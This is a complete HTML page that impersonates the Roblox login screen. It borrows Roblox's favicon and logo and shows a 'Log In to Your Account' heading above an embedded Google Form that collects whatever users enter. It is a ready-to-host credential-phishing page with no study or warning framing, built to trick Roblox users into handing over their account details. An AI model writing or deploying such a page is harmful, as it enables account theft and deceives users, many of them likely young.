<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox</title>
  <link rel="icon" href="https://www.roblox.com/favicon.ico" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #1c1c1c;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    header {
      background-color: #232527;
      width: 100%;
      padding: 15px 30px;
      display: flex;
      align-items: center;
    }

    header img {
      height: 30px;
    }

    .container {
      margin-top: 60px;
      background-color: #2c2c2c;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
      max-width: 100%;
      width: 90%;
      max-width: 800px;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    iframe {
      width: 100%;
      height: 800px;
      border: none;
    }

    @media (max-width: 600px) {
      .container {
        padding: 20px;
      }

      iframe {
        height: 1000px;
      }
    }
  </style>
</head>
<body>
  <header>
    <img src="https://images.rbxcdn.com/6c6a6d21c4016fc20c0d77c5e4b30ff3.svg" alt="Roblox Logo" />
  </header>

  <div class="container">
    <h2>Log In to Your Account</h2>
    <iframe 
      src="https://docs.google.com/forms/d/e/1FAIpQLSen_Jyu6eTPX_bIPezX29gWSrCQLZFTBMw7t9mfP8m1yCorBw/viewform?embedded=true" 
      frameborder="0" 
      marginheight="0" 
      marginwidth="0">
      Loadingâ€¦
    </iframe>
  </div>
</body>
</html>
